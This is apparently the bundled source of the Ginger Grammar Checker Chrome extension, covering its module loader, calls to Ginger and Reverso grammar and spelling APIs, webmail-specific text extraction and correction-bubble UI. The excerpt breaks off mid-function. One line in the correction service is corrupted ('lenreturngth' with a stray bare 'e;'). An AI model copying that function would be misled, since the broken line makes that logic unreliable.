/*
Code architecture and implementation by kristof.mihaly@nomo.hu
For Ginger Software Ltd.
Ginger Grammar Checker Chrome Extension
*/

var $gingerWidgetJquery = $.noConflict(true);

if (!gingerModule) {
    var gingerModule = function(e, t) {
        var o = {};
        var r = function(e) {
            var t = o[e];
            t.module = t.classCache();
            t.isInited = true;
        };
        var n = function(e, t, r) {
            if (o[e]) {
                if (console && console.log) console.log("Module already loaded: " + e, "...overwriting module");
            }
            o[e] = {
                classCache: t,
                isInited: false,
                deps: r
            };
            return o[e];
        };
        var i = function(e) {
            if (e && e.length) {
                var t = true;
                for (var r = 0; r < e.length; r++) {
                    if (!i(e[r])) {
                        t = false;
                        break;
                    }
                }
                return t;
            } else {
                return true;
            }
        };
        var a = function(e, t) {
            if (typeof o[e] === "undefined") {
                throw "Module '" + e + "' is not loaded. Check dependency in the end of your module definition.";
            }
            if (!i(e.deps)) {
                throw "Module '" + e + "' doesn't have all dependencies loaded.";
            }
            if (!o[e].isInited) {
                r(e);
            }
            if (t) return o[e].classCache; else return o[e].module;
        };
        var g = function(e) {
            if (!o[e]) {
                console.log(e, "not added to project or has not been loaded");
                return false;
            } else if (!o[e].isInited) {
                console.log("module ", e, "not loaded, because");
                var t = o[e].deps;
                if (t && t.length) {
                    var r = true;
                    for (var n = 0; n < t.length; n++) {
                        var i = t[n];
                        r = r && g(i);
                    }
                    return r;
                } else {
                    return true;
                }
            } else {
                return true;
            }
        };
        return {
            load: n,
            get: a,
            debug: g
        };
    }();
}

(function() {
    var e = gingerModule.load("widget.ajaxQueue", function() {
        var s = $gingerWidgetJquery({});
        var e = function() {
            s.clearQueue();
        };
        $gingerWidgetJquery.ajaxQueue = function(n) {
            var i, o = $gingerWidgetJquery.Deferred(), a = o.promise();
            var e = s.queue(g);
            a.abort = function(e) {
                if (i && i.abort) {
                    return i.abort(e);
                }
                var t = s.queue(), r = $gingerWidgetJquery.inArray(g, t);
                if (r > -1) {
                    t.splice(r, 1);
                }
                o.rejectWith(n.context || n, [ a, e, "" ]);
                return a;
            };
            function g(e) {
                i = $gingerWidgetJquery.ajax(n).done(o.resolve).fail(o.reject);
            }
            return a;
        };
        return {
            flush: e
        };
    });
})();

(function() {
    var e = gingerModule.load("widget.api", function() {
        var o = $gingerWidgetJquery({});
        var e = {};
        var a = gingerModule.get("widget.cache");
        var g = {};
        var t = null;
        var r = 600;
        var n = [];
        var i = function() {
            if (n.length) n[0]();
        };
        var s = function(t) {
            var r = $gingerWidgetJquery.Deferred();
            if (t) {
                n.push(function() {
                    var e = this;
                    $gingerWidgetJquery.ajax(t).then(function(e) {
                        n.splice(0, 1);
                        i();
                        r.resolve(e);
                    }, function(e) {
                        n.splice(0, 1);
                        i();
                        r.reject(e);
                    });
                });
            }
            if (n.length === 1) {
                i();
            }
            return r.promise();
        };
        var c = function(r, n) {
            var e = a.get("api.detectLang", r);
            if (e) {
                n(e);
            } else {
                var t = {
                    inputText: r
                };
                var i = s({
                    url: "https://async.reverso.net/WebReferences/WSAJAXInterface.asmx/DetectLanguageWS",
                    data: JSON.stringify(t),
                    method: "POST",
                    dataType: "json",
                    contentType: "application/json; charset=utf-8"
                }).then(function e(t) {
                    a.set("api.detectLang", r, t);
                    n(t);
                }, function e() {});
            }
        };
        var l = function(t, r) {
            var e = a.get("api.wordSpell", t);
            if (e) {
                r(e);
            } else {
                p(true);
                var n = {
                    securedPage: "false",
                    authToken: gingerModule.get("widget.config").get("token"),
                    userIdentifier: gingerModule.get("widget.session").get("userId"),
                    apiKey: gingerModule.get("widget.config").get("apiKey"),
                    lang: gingerModule.get("widget.config").get("dialect"),
                    clientVersion: gingerModule.get("widget.config").get("version"),
                    text: encodeURIComponent(t),
                    isFirstInPhrase: "false"
                };
                s({
                    url: "https://servicesht.gingersoftware.com/Dictionary/jsonSecured/IsUserSpelledCorrectly",
                    data: n,
                    datatype: "jsonp",
                    jsonpCallback: "gingerModuleApi.checkWordSpell"
                }).then(function(e) {
                    p(false);
                    if (e.ExceptionType) {
                        return;
                    }
                    a.set("api.wordSpell", t, e);
                    r(e);
                }, function() {
                    p(false);
                });
            }
        };
        var u = function(e, t) {
            var i = e.text;
            var r = a.get("api.sentence", i);
            if (r) {
                if (r.response !== null) {
                    t(JSON.parse(JSON.stringify(r.response)));
                } else {
                    r.cb.push(t);
                }
            } else {
                a.set("api.sentence", i, {
                    response: null,
                    cb: [ t ]
                });
                if (e.id != null && g.sentenceId === e.id && g.abort) {
                    p(false);
                    g.abort();
                }
                var n = {
                    securedPage: "false",
                    userIdentifier: gingerModule.get("widget.session").get("userId"),
                    lang: gingerModule.get("widget.config").get("dialect"),
                    apiKey: gingerModule.get("widget.config").get("apiKey"),
                    clientVersion: gingerModule.get("widget.config").get("version"),
                    text: e.text,
                    isOnTheFly: "false"
                };
                p(true);
                g = s({
                    url: "https://services.gingersoftware.com/Ginger/correct/jsonSecured/GingerTheUserTextFull",
                    data: n,
                    method: "GET"
                }).then(function(e) {
                    p(false);
                    o.trigger("grammarcheck.sent");
                    if (e.ExceptionType) {
                        a.remove("api.sentence", i);
                        return;
                    }
                    var t = a.get("api.sentence", i);
                    if (t && t.cb) {
                        for (var r = 0; r < t.cb.length; r++) {
                            var n = gingerModule.get("widget.utils").clone(e);
                            if (t.cb[r]) t.cb[r](n);
                        }
                    }
                    a.set("api.sentence", i, {
                        response: e
                    });
                }, function() {
                    p(false);
                    a.remove("api.sentence", i);
                });
                g.sentenceId = e.id;
            }
        };
        var d = function(e, t) {
            var r = {
                userIdentifier: gingerModule.get("widget.session").get("userId"),
                apiKey: gingerModule.get("widget.config").get("apiKey"),
                lang: gingerModule.get("widget.config").get("dialect"),
                authToken: gingerModule.get("widget.config").get("token"),
                clientVersion: gingerModule.get("widget.config").get("version")
            };
            r = gingerModule.get("widget.utils").merge(e, r);
            s({
                url: "https://data.gingersoftware.com/clientdata/jsonSecured/UserIgnoredCorrection",
                data: r,
                datatype: "jsonp",
                jsonpCallback: "gingerModuleApi.ignoreCorrection",
                success: function(e) {
                    if (t) t(e);
                },
                error: function() {
                    console.log("error");
                }
            });
        };
        var f = 0;
        var p = function(e) {
            if (t) t = clearTimeout(t);
            if (e) {
                f++;
                if (f == 1) o.trigger("ajax.start");
            } else {
                f--;
                if (f == 0) o.trigger("ajax.end");
            }
        };
        var v = function(t, r) {
            var e = {
                userIdentifier: gingerModule.get("widget.session").get("userId"),
                apiKey: gingerModule.get("widget.config").get("apiKey"),
                lang: gingerModule.get("widget.config").get("dialect"),
                authToken: gingerModule.get("widget.config").get("token"),
                clientVersion: gingerModule.get("widget.config").get("version"),
                word: encodeURIComponent(t),
                securedPage: "false"
            };
            s({
                url: "https://services.gingersoftware.com/Ginger/correct/jsonSecured/AddToPersonalDictionary",
                data: e,
                datatype: "jsonp",
                jsonpCallback: "gingerModuleApi.addToPersonalDictionary",
                success: function(e) {
                    o.trigger("dictionary.added", t);
                    if (r) r(e);
                },
                error: function() {
                    console.log("error");
                }
            });
        };
        var m = function() {
            var e = {};
            var i = a.dump();
            var t = function(e) {
                if (!i[e]) return {};
                var t = {};
                for (var r in i[e]) {
                    var n = i[e][r];
                    if (n.response) t[r] = n;
                }
                return t;
            };
            e["api.wordSpell"] = t("api.wordSpell");
            e["api.sentence"] = t("api.sentence");
            return e;
        };
        var h = function(e) {
            for (var t in e) {
                for (var r in e[t]) {
                    a.set(t, r, e[t][r]);
                }
            }
        };
        var w = function() {};
        w();
        return {
            checkWordSpell: l,
            ignoreMistake: d,
            checkSentence: u,
            addToDictionary: v,
            dumpCorrectionCache: m,
            restoreCorrectionCache: h,
            detectLang: c,
            listen: o
        };
    }, [ "widget.utils", "widget.cache", "widget.ajaxQueue", "widget.session" ]);
})();

(function() {
    var e = gingerModule.load("widget.cache", function() {
        var n = {};
        var e = function(e, t, r) {
            if (!e) e = "default";
            if (!n[e]) n[e] = {};
            n[e][t] = r;
            return r;
        };
        var t = function(e, t) {
            if (n[e] && n[e][t]) return n[e][t]; else return null;
        };
        var r = function() {
            return n;
        };
        var i = function(e) {
            n = e;
        };
        var o = function(e, t) {
            return delete n[e][t];
        };
        var a = function() {
            n = {};
        };
        return {
            set: e,
            get: t,
            remove: o,
            flush: a,
            dump: r,
            restore: i
        };
    });
})();

(function() {
    var e = gingerModule.load("widget.caret", function() {
        var e = function(e, t) {
            e = $gingerWidgetJquery(e).get(0);
            var r = e;
            var n = r && (r.getAttribute("contenteditable") === "" || r.getAttribute("contenteditable") === true || r.getAttribute("contenteditable") == "true");
            if (arguments.length === 1) {
                if (r) {
                    if (window.getSelection) {
                        if (n) {
                            var i = window.getSelection().getRangeAt(0), o = i.cloneRange();
                            o.selectNodeContents(r);
                            o.setEnd(i.endContainer, i.endOffset);
                            return o.toString().length;
                        }
                        return r.selectionStart;
                    }
                    if (r.selectionStart) return r.selectionStart;
                }
                return;
            }
            if (r) {
                if (t == -1) t = e[n ? "text" : "val"]().length;
                if (window.getSelection) {
                    if (n) {
                        r.focus();
                        window.getSelection().collapse(r.firstChild, t);
                    } else r.setSelectionRange(t, t);
                }
                if (!n) r.focus();
            }
        };
        return {
            get: e
        };
    }, []);
})();

(function() {
    var e = gingerModule.load("widget.config", function() {
        var n = $gingerWidgetJquery("<eventScope>");
        var i = {
            userId: null,
            apiKey: null,
            version: "0.0.210",
            widgetUid: null,
            charLimit: null,
            source: null,
            dialect: "US",
            platform: "chrome",
            loggedOutApprovalsLeft: 10
        };
        var e = function(e) {
            return e ? i[e] : i;
        };
        var t = function(e, t) {
            i[e] = t;
            var r = {
                changed: {}
            };
            r.changed[e] = t;
            n.trigger("change", r);
            n.trigger("change/" + e, t);
            return i;
        };
        var r = function(e) {
            i = gingerModule.get("widget.utils").merge(i, e);
        };
        return {
            listen: n,
            get: e,
            set: t,
            merge: r
        };
    }, [ "widget.utils" ]);
})();

(function() {
    var e = gingerModule.load("widget.contentManager", function() {
        var l = function(e) {
            e = e.replace(/<style([\s\S]*?)<\/style>/gi, "");
            e = e.replace(/<script([\s\S]*?)<\/script>/gi, "");
            e = e.replace(/<\/div>/gi, "\n");
            e = e.replace(/<\/li>/gi, "\n");
            e = e.replace(/<li>/gi, "  *  ");
            e = e.replace(/<\/ul>/gi, "\n");
            e = e.replace(/<\/p>/gi, "\n");
            e = e.replace(/<br\s*[\/]?>/gi, "\n");
            e = e.replace(/<[^>]+>/gi, "");
            e = $gingerWidgetJquery("<textarea />").html(e).text();
            return e;
        };
        var u = function(n) {
            n = n.replace(new RegExp("<brs*/?>", "g"), "\n");
            var e = document.createElement("div");
            e.innerHTML = n;
            var t = e.querySelectorAll('[data-block="true"]');
            if (t.length > 0) {
                n = "";
                t.forEach(function(e, t, r) {
                    n = n + e.innerText.replace(/\s+$/, "") + (t < r.length - 1 ? "\n" : "");
                });
            } else {
                n = n.replace(/<[^>]+>/gi, "");
                n = $gingerWidgetJquery("<textarea />").html(n).text();
            }
            return n;
        };
        var d = function(e, t) {
            if (!e) e = [];
            if (/textarea/i.test(t.nodeName)) {
                e.push("change");
            }
            for (var r = 0; r < e.length; r++) {
                var n = document.createEvent("CustomEvent");
                n.initCustomEvent(e[r], true, true, null);
                t.dispatchEvent(n);
            }
        };
        var e = function(e, t, r, n, i) {
            var o = gingerModule.get("widget.utils").isRichTextElement(e);
            var a = o && $gingerWidgetJquery(e).find("[data-block='true']").length > 0 || o && $gingerWidgetJquery(e).closest("[data-reactroot]").length;
            var g = gingerModule.get("widget.siteSettings").get(window.location.href, e);
            var s = e.getAttribute("ginger-widget-mode");
            if (s && s === "contenteditable") {
                a = false;
            }
            if (/<[^>]+>|&\w+;/.test(t)) {
                if (a && o) {
                    t = u(t);
                } else if (!o || a) {
                    t = l(t);
                } else {
                    e.innerHTML = t;
                    return $gingerWidgetJquery.Deferred().resolve();
                }
            }
            if (typeof r === "undefined" && typeof n === "undefined") {
                if (o && !a) {} else if (!o && !a) {
                    $gingerWidgetJquery(e).val(t);
                    d(g.postRewriteEvents, e);
                    return $gingerWidgetJquery.Deferred().resolve();
                }
            }
            var c = p(e);
            if (!r) r = 0;
            if (!n) n = c.replace(/\s+$/gm, "").length;
            return gingerModule.get(g.rewriter).rewrite(e, t, r, n, i);
        };
        var a = function(e) {
            var t = $gingerWidgetJquery("<div></div>").html(e.innerHTML).get(0);
            $gingerWidgetJquery(t).find("[data-block='true']").prepend(String.fromCharCode(31));
            value = $gingerWidgetJquery(t).text().replace(/^\x1F/, "");
            return value;
        };
        var o = function(e) {
            var t = e.innerHTML.replace(/(<[^\/][^>]*>|[\.\!\?])/g, "$1" + String.fromCharCode(28));
            e.outerHTML = "<gingerignorepart>" + t + "</gingerignorepart>";
        };
        var c = function(e) {
            var t = document.createElement("div");
            t.innerHTML = e;
            var r = location.hostname;
            if (self != top && (/localhost/.test(r) || !r) && window.parent.location) r = window.parent.location.hostname;
            if (/localhost/.test(r)) {
                var n = t.querySelectorAll(".quoted-part-of-email");
                n.forEach(function(e) {
                    o(e);
                });
            }
            if (/1und1.de|gmx.net|gmx.com|web.de/.test(r)) {
                var n = t.querySelectorAll('[name="quote"]');
                n.forEach(function(e) {
                    o(e);
                });
            }
            if (/mail.aol.com/.test(r)) {
                var n = t.querySelectorAll("div");
                if (n.length) {
                    n.forEach(function(e) {
                        if (e.previousElementSibling && "BR" === e.previousElementSibling.tagName && e.textContent && e.textContent.startsWith("-----")) {
                            o(e);
                        }
                    });
                }
            }
            if (/gmail.com|mail.google.com/.test(r)) {
                var n = t.querySelectorAll('.gmail_quote, .gmail_signature, [data-smartmail="gmail_signature"]');
                n.forEach(function(e) {
                    o(e);
                });
            }
            if (/outlook.live.com|outlook.office365.com|outlook.office.com/.test(r)) {
                var n = $gingerWidgetJquery(t.querySelectorAll('[id="divRplyFwdMsg"]')).nextAll().toArray();
                var i = t.querySelector('[id="divRplyFwdMsg"]');
                if (i) n.push(i);
                n.forEach(function(e) {
                    o(e);
                });
            }
            if (/mail.protonmail.com|old.protonmail.com/.test(r)) {
                var n = t.querySelectorAll(".protonmail_signature_block, blockquote.protonmail_quote");
                n.forEach(function(e) {
                    o(e);
                });
            }
            if (/mail.yahoo.com/.test(r)) {
                var n = t.querySelectorAll('[class*="yahoo_quoted"], [class*="signature"]');
                n.forEach(function(e) {
                    o(e);
                });
            }
            if (/mail.zoho.com|mail.zoho.eu/.test(r)) {
                var n = t.querySelectorAll('[id*="Zm-_Id_-Sgn"], [class*="zmail_extra"]');
                n.forEach(function(e) {
                    o(e);
                });
            }
            if (/icloud.com/.test(r)) {
                var n = t.querySelectorAll('blockquote[type="cite"]');
                n.forEach(function(e) {
                    o(e);
                });
            }
            return t.innerHTML.replace(/gingerignorepart/g, "!");
        };
        var g = function(e) {
            var t = e.innerHTML;
            if (!t) return "";
            function r(e, t) {
                return (t ? "(" : "(?:") + e + ")";
            }
            if (e === document.body) {
                t = t.replace(/<div class="ginger-extension-writer".*$/i, "").replace(/<div class="ginger-module-correctionBubble".*$/i, "");
            }
            var n = "br|p|div|h\\d|table|ol|ul|li|tbody|de|dt|td|th|tr|caption|textarea|button|select|pre|address|body";
            var i = "code|noscript|object|style|template|script|var|img|blockquote|svg|canvas";
            var o = "[^>]*";
            var a = "/?";
            var g = {
                compactBlockTags: {
                    pattern: new RegExp("<" + r(a, true) + r(n) + o + ">", "gi"),
                    replace: "<+>"
                },
                aggregateConsecutiveOpeningBlockTags: {
                    pattern: new RegExp("(?:<" + r(n) + o + ">)+", "gi"),
                    replace: "<ginger-block-elem>"
                },
                aggregateConsecutiveClosingBlockTags: {
                    pattern: new RegExp("(?:</" + r(n) + o + ">)+", "gi"),
                    replace: "</ginger-block-elem>"
                },
                aggregateConsecutiveOpenClosingBlockTags: {
                    pattern: new RegExp("(?:</ginger-block-elem><ginger-block-elem>)", "gi"),
                    replace: "<ginger-block-break/>"
                },
                representBlockElemDifferencesWithNewLineRepresentation: {
                    pattern: new RegExp("(?:<(ginger-block-elem|/ginger-block-elem|ginger-block-break/)>)", "gi"),
                    replace: String.fromCharCode(31)
                },
                removeTrailingAndStartingNewLines: {
                    pattern: new RegExp("(^|$)"),
                    replace: ""
                },
                ignoreTags: {
                    pattern: new RegExp("<(/?)" + r(i) + "([^>]*)>", "gi"),
                    replace: "<$1!>"
                },
                removeNewLines: {
                    pattern: /\n/gi,
                    replace: " "
                }
            };
            t = c(t);
            t = f(t, g.aggregateConsecutiveOpeningBlockTags);
            t = f(t, g.aggregateConsecutiveClosingBlockTags);
            t = f(t, g.compactBlockTags);
            t = f(t, g.aggregateConsecutiveOpenClosingBlockTags);
            t = t.replace(/<(\/?)(code|noscript|object|style|template|script|var|img|blockquote|svg|canvas)([^>]*)>/gi, "<$1!>");
            t = f(t, g.representBlockElemDifferencesWithNewLineRepresentation);
            t = t.replace(/<!>/g, String.fromCharCode(31) + String.fromCharCode(28)).replace(/<\/!>/g, String.fromCharCode(31));
            if ($gingerWidgetJquery(e).css("whiteSpace") !== "pre-wrap") {
                t = f(t, g.removeNewLines);
            }
            t = f(t, g.removeTrailingAndStartingNewLines);
            var s = document.createElement("div");
            s.innerHTML = t;
            $gingerWidgetJquery(s).find(".XjviVd").remove();
            t = s.textContent;
            return t;
        };
        var f = function(e, t) {
            return e.replace(t.pattern, t.replace);
        };
        var p = function(e) {
            var t;
            var r = gingerModule.get("widget.utils").isRichTextElement(e);
            var n = r && $gingerWidgetJquery(e).find("[data-block='true']").length > 0 || r && $gingerWidgetJquery(e).closest("[data-reactroot]").length;
            var i = e.getAttribute("ginger-widget-mode");
            if (i && i === "contenteditable") {
                n = false;
            }
            var o = r && /pluggable-input-body/.test(e.className);
            if (o) {
                t = a(e);
            } else if (r) {
                t = g(e);
            } else {
                t = $gingerWidgetJquery(e).val();
            }
            t = t.replace("^\n+", "");
            return t;
        };
        return {
            setVal: e,
            getVal: p
        };
    }, [ "widget.utils" ]);
})();

(function() {
    var e = gingerModule.load("widget.correctionBubble", function() {
        var $ = $gingerWidgetJquery({});
        var e;
        var C;
        var M;
        var W;
        var S;
        var r;
        var t;
        var n;
        var q = 28;
        var k = 0;
        var J = null;
        var i = 600;
        var T = null;
        var E = {};
        var L = null;
        var A = null;
        var o = function(e, t, r) {
            if (!C || C.parent().length === 0) I();
            if ($gingerWidgetJquery(C).is(":hover") && $gingerWidgetJquery(C).is(":visible")) return;
            if (gingerModule.get("widget.licenseLimits").isCapacityLimited()) {
                N(true);
            } else {
                N(false);
            }
            F();
            if (J) J = clearTimeout(J);
            if (gingerModule.get("widget.session").isLoggedIn()) {
                R(false);
            } else {
                if (gingerModule.get("widget.licenseLimits").hasLoggedOutApprovalsLeft()) {
                    R(false);
                } else {
                    R(true);
                }
            }
            var n = $gingerWidgetJquery(".gwmw-" + e.id).eq(0);
            if (!n) n = $gingerWidgetJquery("#gwmw-" + e.id);
            if (L && L.id === e.id) {
                return;
            }
            L = e;
            A = t;
            T = r;
            E = {
                sentenceId: t.id,
                correctionId: e.id,
                sentence: t,
                correction: e
            };
            $gingerWidgetJquery(S).empty();
            var i = [];
            var o = e.UXFrgFrom;
            var a = e.UXFrgTo;
            var g = o;
            var s = gingerModule.get("widget.phraseService").getSentenceFragments(t, o, a);
            for (var c = 0; c < s.length; c++) {
                var l;
                if (s[c].correction) {
                    var u = s[c].correction.Suggestions.length != 0;
                    l = document.createElement("gwbm");
                    l.id = "gwbm-" + s[c].correction.id;
                    l.className = "ginger-module-correctionBubbleService-mistake-type-" + s[c].correction.Type;
                    if (u) {
                        l.appendChild(document.createTextNode(s[c].correction.Suggestions[0].Text));
                    } else {
                        l.appendChild(document.createTextNode(s[c].text));
                        l.className += " ginger-module-correctionBubbleService-mistake-nosuggestion";
                    }
                    (function(t, e) {
                        var r = document.createElement("gwbmo");
                        if (m) {
                            r.className = "ginger-module-correctionBubbleService-mistake-bubble-under";
                        }
                        var n = document.createElement("ga");
                        var i = document.createElement("ga");
                        var o = document.createElement("ga");
                        n.className = "ginger-module-correctionBubbleService-mistake-bubble-approve";
                        i.className = "ginger-module-correctionBubbleService-mistake-bubble-ignore";
                        o.className = "ginger-module-correctionBubbleService-mistake-bubble-add";
                        n.title = "Approve the Suggestion";
                        i.title = "Ignore the Suggestion";
                        o.title = "Add to Personal Dictionary";
                        n.onmousedown = function(e) {
                            $.trigger("approved.mistake", E);
                            if (gingerModule.get("widget.licenseLimits").isCapacityLimited()) {
                                $.trigger("limited.approve");
                            } else {
                                if (!gingerModule.get("widget.session").isLoggedIn()) {
                                    if (!gingerModule.get("widget.licenseLimits").hasLoggedOutApprovalsLeft()) {
                                        $.trigger("unauthenticated.approve");
                                        return;
                                    }
                                }
                                O("approve", {
                                    correctionId: t.id
                                }, true);
                                $gingerWidgetJquery("#gwbm-" + t.id).replaceWith(document.createTextNode($gingerWidgetJquery("#gwbm-" + t.id).text()));
                                F();
                            }
                            e.stopPropagation();
                            e.preventDefault();
                            return false;
                        };
                        i.onmousedown = function(e) {
                            $.trigger("ignored.mistake", E);
                            O("ignore", {
                                correctionId: t.id
                            }, true);
                            $gingerWidgetJquery("#gwbm-" + t.id).replaceWith(document.createTextNode($gingerWidgetJquery("#gwbm-" + t.id).text()));
                            F();
                            e.stopPropagation();
                            e.preventDefault();
                            return false;
                        };
                        o.onmousedown = function(e) {
                            if (!gingerModule.get("widget.session").isLoggedIn()) {
                                $.trigger("unauthenticated.addToDictionary");
                            } else {
                                $.trigger("addedtodict.mistake", E);
                                O("addToDictionary", {
                                    correctionId: t.id
                                }, true);
                            }
                            F();
                            e.stopPropagation();
                            e.preventDefault();
                            return false;
                        };
                        if (u) {
                            r.appendChild(n);
                        }
                        if (s[c].correction.Type == 1 && s[c].correction.Mistakes[0].CanAddToDict && !gingerModule.get("widget.config").get("disableAddToDictionary")) {
                            r.appendChild(o);
                        } else {
                            r.appendChild(i);
                        }
                        e.appendChild(r);
                    })(s[c].correction, l);
                } else {
                    l = document.createTextNode(s[c].text);
                }
                $gingerWidgetJquery(S).get(0).appendChild(l);
            }
            C.css("z-index", gingerModule.get("widget.utils").findHighestZIndex(n) + 10);
            C.show();
            var d = $gingerWidgetJquery(n).offset();
            var f = $gingerWidgetJquery(window.document.body).offset();
            if (f.left) {
                d.left -= f.left;
            }
            var p = $gingerWidgetJquery(n).height();
            var v = $gingerWidgetJquery(n).width();
            C.css("padding", k);
            var m;
            var h = 22;
            var w = d.top - q;
            if (w - h < 0) {
                m = true;
                w = d.top + q;
            } else if (w - h <= $gingerWidgetJquery("html,body").scrollTop()) {
                m = true;
                w = d.top + q;
            }
            C.css("top", w);
            var y = C.offset();
            var b = C.width();
            $.trigger("show", {
                correction: L,
                sentence: A
            });
            var x = $gingerWidgetJquery(W).is(":visible") ? $gingerWidgetJquery(W).outerWidth() : $gingerWidgetJquery(M).outerWidth();
            if (y.top === w && y.left <= d.left && y.left + b >= d.left + v) {} else {
                C.css("left", d.left);
            }
            if (d.left + x > $gingerWidgetJquery(window).width()) {
                C.css("left", $gingerWidgetJquery(window).width() - x - 10);
            }
            return;
        };
        var a = function(e, t) {
            if (C) {
                if ($gingerWidgetJquery(C).is(":visible")) {
                    $.trigger("hide", {
                        correction: L,
                        sentence: A
                    });
                }
                C.hide();
            }
            L = null;
            A = null;
        };
        var F = function() {
            if (J) J = clearTimeout(J);
        };
        var g = function(e, t) {
            F();
            J = setTimeout(function() {
                s();
            }, i);
        };
        var I = function() {
            var e = document.body.hasAttribute("contenteditable") ? document.body.parentNode : document.body;
            C = $gingerWidgetJquery("<gdiv class='ginger-module-correctionBubble'></gdiv>").appendTo(e);
            W = $gingerWidgetJquery("<gdiv class='ginger-module-correctionBubble-container ginger-module-correctionBubble-container-loggedout'><gdiv class='ginger-module-correctionBubble-login'>Log in</gdiv><gdiv class='ginger-module-correctionBubble-body'>for free to continue using Ginger.</gdiv></gdiv>").appendTo(C);
            M = $gingerWidgetJquery("<gdiv class='ginger-module-correctionBubble-container ginger-module-correctionBubble-container-loggedin'></gdiv>").appendTo(C);
            r = $gingerWidgetJquery("<gdiv class='ginger-module-correctionBubble-limited'>Limited mode</gdiv>").appendTo(M);
            r.on("click", function(e) {
                gingerModule.get("widget.licenseLimits").approvalsUsed(0);
                e.stopPropagation();
                e.preventDefault();
                return false;
            });
            W.on("click", function(e) {
                $.trigger("unauthenticated.approve.all");
                e.stopPropagation();
                e.preventDefault();
                return false;
            });
            S = $gingerWidgetJquery("<gdiv class='ginger-module-correctionBubble-body'></gdiv>").appendTo(M);
            var t = $gingerWidgetJquery("<ga href='javascript:' class='ginger-module-correctionBubble-close' title='Ignore mistake'>&times;</ga>").appendTo(M);
            t.on("mousedown", function(e) {
                e.stopPropagation();
                e.preventDefault();
                if (gingerModule.get("widget.licenseLimits").isCapacityLimited()) {
                    $.trigger("limited.approve");
                } else {
                    $.trigger("ignore.all", E);
                    O("ignoreAll");
                }
                return false;
            });
            S.on("mousedown", function(e) {
                e.stopImmediatePropagation();
                e.preventDefault();
                e.stopPropagation();
                if (gingerModule.get("widget.licenseLimits").isCapacityLimited()) {
                    $.trigger("limited.approve.all");
                } else {
                    if (!gingerModule.get("widget.session").isLoggedIn()) {
                        if (!gingerModule.get("widget.licenseLimits").hasLoggedOutApprovalsLeft()) {
                            $.trigger("unauthenticatedWithinLimit.approve.all");
                            return;
                        }
                    }
                    $.trigger("approve.all", E);
                    O("approveAll");
                    a();
                }
                return false;
            });
            if (C.closest("[contenteditable]").length) {
                C.attr("contenteditable", false);
            }
            C.hide();
            $gingerWidgetJquery(C).on("mouseleave", function e(t) {
                g();
            });
            $gingerWidgetJquery(C).on("mouseenter", function e(t) {
                setTimeout(F, 60);
            });
            N(false);
        };
        var O = function(e, t, r) {
            if (T) {
                T(e, t ? t : E);
            }
            if (!r) a();
        };
        var s = function() {
            T = null;
            a();
        };
        var R = function(e) {
            var t = $gingerWidgetJquery(M);
            var r = $gingerWidgetJquery(W);
            if (e) {
                t.hide();
                r.show();
            } else {
                t.show();
                r.hide();
            }
        };
        var N = function(e) {
            if (e) {
                $gingerWidgetJquery(C).addClass("ginger-module-correctionBubble-limitedmode");
            } else {
                $gingerWidgetJquery(C).removeClass("ginger-module-correctionBubble-limitedmode");
            }
        };
        var c = function() {};
        return {
            show: o,
            hide: a,
            gracefulHide: g,
            listen: $,
            setLimitedVisibility: N,
            init: c
        };
    }, [ "widget.utils", "widget.inputFinder", "widget.licenseLimits", "widget.session" ]);
})();

(function() {
    var e = gingerModule.load("widget.correctionService", function(e) {
        var u = [];
        var s = function(g, s) {
            var c = g.words.length;
            var l = [];
            if (g.words.length === 0) {
                s(g);
            }
            for (var e = 0; e < g.words.length; e++) {
                if (u.indexOf(g.words[e]) === -1) (function(e) {
                    var o = g.words[e];
                    var a = gingerModule.get("widget.utils").trimAndMatch(o.text);
                    gingerModule.get("widget.api").checkWordSpell(a.text, function(e) {
                        o.correction = e.IsUserSpelledCorrectlyResult;
                        if (!o.correction.IsCorrect) {
                            var t = o.startsAt + a.pre.length - g.startsAt;
                            var r = t + a.text.length;
                            r = r - 1;
                            if (o.correction.IsCorrect !== true) {
                                var n = g.correction && g.correction.Corrections ? d(g.correction.Corrections, t, r) : null;
                                var i = {
                                    From: t,
                                    To: r,
                                    UXFrgFrom: t,
                                    UXFrgTo: r,
                                    Type: 1,
                                    Suggestions: [],
                                    Mistakes: [ {
                                        From: t,
                                        To: r,
                                        CanAddToDict: true
                                    } ],
                                    id: n ? n.id : gingerModule.get("widget.utils").generateUID()
                                };
                                l.push(i);
                            }
                        }
                        c--;
                        if (c == 0) {
                            if (!g.correction) {
                                g.correction = {
                                    checkType: "shallow"
                                };
                            }
                            g.correction.Corrections = l;
                            s(g);
                        }
                    });
                })(e);
            }
        };
        var c = function(r, n) {
            r = JSON.parse(JSON.stringify(r));
            if (r.words.length) {
                var i = r.words.length - 1;
                var e = r.words[i].text;
                var t = /[\s\n]+$/g;
                var o = e.match(t);
                if (o) {
                    r.text = r.text.replace(t, "");
                    r.words[i].text = e.replace(t, "");
                }
            }
            gingerModule.get("widget.api").checkSentence(r, function(e) {
                try {
                    r.correction = e;
                    if (o) {
                        r.words[i].text += o;
                        r.text += o;
                    }
                    for (var t = 0; t < r.correction.Corrections.length; t++) {
                        var e = r.correction.Corrections[t];
                        if (!e.id) {
                            e.id = gingerModule.get("widget.utils").generateUID();
                        }
                    }
                    n(r);
                } catch (e) {
                    if (window.Sentry) {
                        Sentry.captureException(e);
                    } else {
                        if (console && console.error) console.error(e);
                        throw new Error(e);
                    }
                    n(r);
                }
            });
        };
        var t = function(e, t, r) {
            e.ignored = true;
            if (e.Type === 1) {
                var n = t.text;
                var i = n.substring(e.From, e.To + 1);
                var o = e.Suggestions.length ? e.Suggestions[0].Text : t.text.substring(e.From, e.To + 1);
                var a = n.substring(e.UXFrgFrom, e.UXFrgTo);
                var g = e.TopLrnCatId;
                var s = gingerModule.get("widget.config").get("dialect");
                gingerModule.get("widget.api").ignoreMistake({
                    ignoredWord: i,
                    suggestedCorrection: o,
                    uxFragment: a,
                    originalSentence: n,
                    categoryId: g,
                    dictionaryLanguage: s
                }, function(e) {
                    if (r) r(e);
                });
                u.push(i);
            }
            return e;
        };
        var l = function(e) {
            if (!e.correction.Corrections || !e.correction.Corrections.lenreturngth) {
                e;
            }
            var t = false;
            var r = [];
            for (var n = 0; n < e.correction.Corrections.length; n++) {
                var i = e.correction.Corrections[n];
                if (!i.id) {
                    i.id = gingerModule.get("widget.utils").generateUID();
                }
                var o = e.text.substring(i.From, i.To + 1);
                if (i.Type === 1 && u.indexOf(o) !== -1) {
                    i.ignored = true;
                    t = true;
                }
            }
            return e;
        };
        var r = function(i, o, a) {
            if (!i) return;
            var g = i.length;
            for (var e = 0; e < i.length; e++) {
